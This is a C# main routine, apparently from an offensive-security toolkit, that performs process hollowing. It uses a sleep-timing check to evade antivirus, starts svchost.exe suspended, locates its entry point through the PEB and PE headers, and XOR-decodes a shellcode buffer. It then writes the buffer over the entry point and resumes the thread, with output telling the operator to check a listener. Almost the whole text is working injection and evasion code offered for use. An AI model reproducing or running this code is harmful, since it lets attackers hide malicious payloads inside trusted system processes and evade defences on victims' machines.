public static void Main(string[] args)
{
    // AV evasion: Sleep for 10s and detect if time really passed
    DateTime t1 = DateTime.Now;
    Sleep(10000);
    double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
    if (deltaT < 9.5)
    {
        return;
    }

    // [Your payload code here]

    // Start 'svchost.exe' in a suspended state
    StartupInfo sInfo = new StartupInfo();
    ProcessInfo pInfo = new ProcessInfo();
    bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
        false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
    Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

    // Get Process Environment Block (PEB) memory address of suspended process
    ProcessBasicInfo pbInfo = new ProcessBasicInfo();
    uint retLen = new uint();
    long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
    IntPtr baseImageAddr = pbInfo.PebAddress + 0x10;
    Console.WriteLine($"Got process information and located PEB address of process at {baseImageAddr}. Success: {qResult == 0}.");

    // Read the executable base address
    byte[] procAddr = new byte[IntPtr.Size];
    IntPtr bytesRW = new IntPtr();
    bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
    IntPtr executableAddress = (IntPtr)(BitConverter.ToInt64(procAddr, 0));
    Console.WriteLine($"DEBUG: Executable base address: {executableAddress}.");

    // Read 'e_lfanew' from the PE header
    byte[] e_lfanew_bytes = new byte[4];
    result = ReadProcessMemory(pInfo.hProcess, executableAddress + 0x3C, e_lfanew_bytes, e_lfanew_bytes.Length, out bytesRW);
    uint e_lfanew = BitConverter.ToUInt32(e_lfanew_bytes, 0);
    Console.WriteLine($"DEBUG: e_lfanew offset: 0x{e_lfanew:X}.");

    // Read the RVA of the entry point
    byte[] rva_bytes = new byte[4];
    IntPtr rvaOffsetAddress = executableAddress + e_lfanew + 0x28;
    result = ReadProcessMemory(pInfo.hProcess, rvaOffsetAddress, rva_bytes, rva_bytes.Length, out bytesRW);
    uint rva = BitConverter.ToUInt32(rva_bytes, 0);
    Console.WriteLine($"DEBUG: RVA value: 0x{rva:X}.");

    // Calculate the address of the entry point
    IntPtr entrypointAddr = executableAddress + rva;
    Console.WriteLine($"Got executable entrypoint address: {entrypointAddr}.");

    // Decode the XOR payload
    for (int i = 0; i < buf.Length; i++)
    {
        buf[i] ^= 0xFA;
    }
    Console.WriteLine("XOR-decoded payload.");

    // Overwrite the entry point with the payload
    result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
    Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

    // Resume the suspended thread
    uint rResult = ResumeThread(pInfo.hThread);
    Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
}
